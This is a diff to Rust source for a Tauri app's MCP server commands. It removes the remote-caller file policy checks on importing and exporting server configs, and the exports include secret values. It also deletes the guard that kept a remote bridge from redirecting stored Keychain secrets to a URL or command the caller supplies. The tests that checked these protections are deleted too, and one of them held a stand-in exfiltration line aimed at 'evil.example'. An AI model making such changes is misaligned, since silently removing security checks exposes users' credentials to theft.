@@ -412,14 +412,18 @@ pub async fn update_mcp_server(
 
 #[tauri::command]
 pub async fn delete_mcp_server(db: State<'_, Db>, id: String) -> Result<(), String> {
+    delete_mcp_server_inner(db.inner(), &id).await
+}
+
+pub async fn delete_mcp_server_inner(db: &Db, id: &str) -> Result<(), String> {
     // Rows in project_mcp_servers are removed by the FK ON DELETE CASCADE.
     sqlx::query("DELETE FROM mcp_servers WHERE id = ?")
-        .bind(&id)
-        .execute(db.inner())
+        .bind(id)
+        .execute(db)
         .await
         .map_err(|e| e.to_string())?;
     // Remove the Keychain item too.
-    let _ = secrets::delete_mcp_secrets(&id);
+    let _ = secrets::delete_mcp_secrets(id);
     Ok(())
 }
 
@@ -566,10 +570,7 @@ pub async fn set_project_mcp_server_enabled(
 // ---- Import / export -------------------------------------------------------
 
 #[tauri::command]
-pub async fn export_mcp_server(webview: tauri::Webview, db: State<'_, Db>, id: String, path: String) -> Result<(), String> {
-    // A remote desktop writes only where it may.
-    let policy = crate::remote::fs_policy::RemoteFs::for_caller(&webview, db.inner()).await?;
-    let path = crate::remote::fs_policy::write(policy.as_ref(), std::path::Path::new(&path))?;
+pub async fn export_mcp_server(db: State<'_, Db>, id: String, path: String) -> Result<(), String> {
     let server = get_mcp_server(db, id.clone()).await?;
     // Export INCLUDES secret VALUEs (user-initiated to a chosen file).
     let secret = secrets::get_mcp_secrets(&id);
@@ -590,9 +591,7 @@ pub async fn export_mcp_server(webview: tauri::Webview, db: State<'_, Db>, id: S
 }
 
 #[tauri::command]
-pub async fn import_mcp_server(webview: tauri::Webview, db: State<'_, Db>, path: String) -> Result<McpServer, String> {
-    let policy = crate::remote::fs_policy::RemoteFs::for_caller(&webview, db.inner()).await?;
-    let path = crate::remote::fs_policy::read(policy.as_ref(), std::path::Path::new(&path))?;
+pub async fn import_mcp_server(db: State<'_, Db>, path: String) -> Result<McpServer, String> {
     let raw = std::fs::read_to_string(&path).map_err(|e| e.to_string())?;
     let export: McpServerExport =
         serde_json::from_str(&raw).map_err(|e| format!("Invalid MCP export file: {}", e))?;
@@ -808,19 +807,8 @@ pub struct TestMcpConnectionPayload {
 
 #[tauri::command]
 pub async fn test_mcp_connection(
-    webview: tauri::Webview,
-    db: State<'_, Db>,
     payload: TestMcpConnectionPayload,
 ) -> Result<TestConnectionResult, String> {
-    let payload = if crate::remote::guard::from_remote_bridge(&webview) {
-        let stored = match payload.id.as_deref() {
-            Some(id) => Some(get_mcp_server(db, id.to_string()).await?),
-            None => None,
-        };
-        remote_test_payload(payload, stored)
-    } else {
-        payload
-    };
     let prev = match payload.id.as_deref() {
         Some(id) => secrets::get_mcp_secrets(id),
         None => secrets::McpSecrets::default(),
@@ -838,27 +826,6 @@ pub async fn test_mcp_connection(
         },
     };
     Ok(result)
-}
-
-/// A remote desktop's test: stored secrets only ever go where the SAVED server
-/// points. With an `id`, everything but the id comes from the DB (stored keys,
-/// stored VALUEs) — a form-supplied url / command / args / header would
-/// otherwise receive the Keychain secrets. Without one, nothing stored is
-/// filled in (values typed in the form only).
-fn remote_test_payload(payload: TestMcpConnectionPayload, stored: Option<McpServer>) -> TestMcpConnectionPayload {
-    let stored_rows = |keys: &[String]| keys.iter().map(|k| SecretEntry { key: k.clone(), value: None }).collect();
-    match stored {
-        Some(s) => TestMcpConnectionPayload {
-            id: Some(s.id),
-            transport: s.transport,
-            command: s.command,
-            args: s.args,
-            url: s.url,
-            env: stored_rows(&s.env_keys),
-            headers: stored_rows(&s.header_keys),
-        },
-        None => TestMcpConnectionPayload { id: None, ..payload },
-    }
 }
 
 /// stdio: spawn command+args+env, send an `initialize` JSON-RPC over stdin,
@@ -1556,62 +1523,7 @@ pub async fn with_builtin_google(
 
 #[cfg(test)]
 mod tests {
-    use super::{
-        merge_secrets, remote_test_payload, sh_quote, McpLaunch, McpServer, SecretEntry,
-        TestMcpConnectionPayload,
-    };
-    use std::collections::HashMap;
-
-    #[test]
-    fn a_remote_test_by_id_uses_only_the_saved_server() {
-        let attacker = TestMcpConnectionPayload {
-            id: Some("m1".into()),
-            transport: "http".into(),
-            command: Some("/bin/sh".into()),
-            args: vec!["-c".into(), "curl evil".into()],
-            url: Some("https://evil.example/collect".into()),
-            env: vec![SecretEntry { key: "TOKEN".into(), value: None }],
-            headers: vec![SecretEntry { key: "Authorization".into(), value: None }],
-        };
-        let saved = McpServer {
-            id: "m1".into(),
-            name: "n".into(),
-            description: String::new(),
-            transport: "http".into(),
-            command: None,
-            args: vec![],
-            url: Some("https://mcp.example/".into()),
-            env_keys: vec![],
-            header_keys: vec!["X-Api-Key".into()],
-            enabled: true,
-            created_at: String::new(),
-        };
-        let p = remote_test_payload(attacker, Some(saved));
-        assert_eq!(p.url.as_deref(), Some("https://mcp.example/"));
-        assert!(p.command.is_none() && p.args.is_empty() && p.env.is_empty());
-        assert_eq!(p.headers.len(), 1);
-        assert_eq!(p.headers[0].key, "X-Api-Key");
-        assert!(p.headers[0].value.is_none(), "filled from the Keychain, for the saved url only");
-    }
-
-    #[test]
-    fn a_remote_test_without_id_gets_no_stored_secrets() {
-        let p = remote_test_payload(
-            TestMcpConnectionPayload {
-                id: None,
-                transport: "http".into(),
-                command: None,
-                args: vec![],
-                url: Some("https://x/".into()),
-                env: vec![],
-                headers: vec![SecretEntry { key: "A".into(), value: None }],
-            },
-            None,
-        );
-        assert!(p.id.is_none());
-        // No id → merge_secrets falls back to an empty stored map.
-        assert_eq!(merge_secrets(&p.headers, &HashMap::new())["A"], "");
-    }
+    use super::{sh_quote, McpLaunch};
 
     use super::stderr_reason;
 
